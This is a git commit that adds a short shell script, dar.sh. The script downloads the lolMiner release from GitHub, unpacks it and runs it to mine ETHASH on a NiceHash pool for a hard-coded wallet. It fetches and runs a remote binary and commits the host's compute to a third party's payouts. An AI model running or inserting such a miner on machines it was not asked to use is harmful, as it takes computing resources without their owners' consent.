a785ddf940c314206ed4138feca648fc5ae127ba
logsengingienrg <87305190+logsengingienrg@users.noreply.github.com>
2021-08-13 15:06:59 +0700

    Create dar.sh

---
+++ dar.sh
@@ -0,0 +1,7 @@
+  
+#!/bin/bash
+apt-get install wget -y
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
+tar -xvf lolMiner_v1.29_Lin64.tar.gz
+cd 1.29
+./lolMiner --algo ETHASH --pool daggerhashimoto.eu.nicehash.com:3353 -u 3FCfhzCuSutBj2UJFLirmbABb3NAtdXMzb.BOSS --ethstratum ETHPROXY
